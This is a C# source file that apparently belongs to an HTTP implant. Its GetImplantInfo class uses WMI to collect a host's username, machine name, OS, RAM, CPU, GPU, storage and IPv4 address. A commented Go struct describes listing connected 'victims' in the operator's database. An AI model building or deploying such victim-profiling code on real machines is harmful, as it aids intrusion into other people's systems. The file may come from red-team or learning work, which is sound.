using System;
using System.Management;
using System.Net.NetworkInformation;
using System.Text;

namespace HTTPImplant.Modules
{

    /*
     // Define a structure above to handle JSON request/responses to list the victims that have connected to the database.
    type ListDevices struct {
        Username        string `json:"Victim.username"`
        Network         string `json:"Network.ip_address"`
        OperatingSystem string `json:"Operating_System.name"`
        CPU             string `json:"CPU.architecture"`
        GPU             string `json:"GPU.information"`
        RAM             string `json:"RAM.amount"`
        Storage         string `json:"Storage.amount"`
    }
     */
    public class GetImplantInfo
    {
        public static string Username()
        {
            return Environment.UserName;
        }

        public static string GetCurrentDate()
        {
            return DateTime.UtcNow.ToString("o"); // ISO 8601 format
        }

        public static string GetComputerName()
        {
            return Environment.MachineName;
        }

        private static readonly Random random = new Random();
        private static readonly string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

        public static string GenerateRandomString(int length = 6)
        {
            var stringBuilder = new StringBuilder(length);

            for (int i = 0; i < length; i++)
            {
                stringBuilder.Append(chars[random.Next(chars.Length)]);
            }

            return stringBuilder.ToString();
        }

        public static string OperatingSystem()
        {
            var searcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem");
            foreach (var os in searcher.Get())
            {
                return os["Caption"].ToString();
            }
            return "Unknown Operating System";
        }

        public static int RAM()
        {
            ObjectQuery winQuery = new ObjectQuery("SELECT * FROM Win32_PhysicalMemory");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(winQuery);

            long totalCapacity = 0;
            foreach (ManagementObject item in searcher.Get())
            {
                totalCapacity += Convert.ToInt64(item["Capacity"]);
            }

            int totalCapacityInMB = (int)(totalCapacity / (1024 * 1024)); // Convert bytes to megabytes
            return totalCapacityInMB;
        }

        public static string CPU()
        {
            ObjectQuery winQuery = new ObjectQuery("SELECT * FROM Win32_Processor");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(winQuery);

            UInt16 arch = 0;

            foreach (ManagementObject item in searcher.Get())
            {
                arch = (UInt16)item["Architecture"];
            }

            switch (arch)
            {
                case 0: return "x86";
                case 1: return "MIPS";
                case 2: return "Alpha";
                case 3: return "PowerPC";
                case 6: return "Itanium-based systems";
                case 9: return "x64";
                default: return "Unknown";
            }
        }

        public static string GPU()
        {
            ObjectQuery winQuery = new ObjectQuery("SELECT * FROM Win32_VideoController");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(winQuery);

            string gpuInfo = "";

            foreach (ManagementObject item in searcher.Get())
            {
                gpuInfo = (string)item["Name"]; // Changed from "VideoProcesor" to "Name"
            }

            return gpuInfo;
        }

        public static string Storage()
        {
            ObjectQuery winQuery = new ObjectQuery("SELECT * FROM Win32_DiskDrive");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(winQuery);

            long totalSize = 0;

            foreach (ManagementObject item in searcher.Get())
            {
                if (item["Size"] != null)
                {
                    totalSize += Convert.ToInt64(item["Size"]);
                }
            }

            return FormatSize(totalSize);
        }

        private static string FormatSize(long bytes)
        {
            const long scale = 1024;
            string[] orders = new string[] { "GB", "TB", "PB", "EB" };
            long max = (long)Math.Pow(scale, orders.Length - 1);

            foreach (string order in orders)
            {
                if (bytes > max)
                {
                    return string.Format("{0:##.##} {1}", decimal.Divide(bytes, max), order);
                }
                max /= scale;
            }
            return "0 GB";
        }

        public static string Network()
        {
            foreach (NetworkInterface netInterface in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (netInterface.NetworkInterfaceType == NetworkInterfaceType.Loopback)
                    continue;

                IPInterfaceProperties ipProps = netInterface.GetIPProperties();
                foreach (UnicastIPAddressInformation addr in ipProps.UnicastAddresses)
                {
                    if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork) // IPv4 addresses
                    {
                        return addr.Address.ToString(); // Return the first non-loopback IPv4 address found
                    }
                }
            }

            return "No IPv4 address found";
        }
    }
}
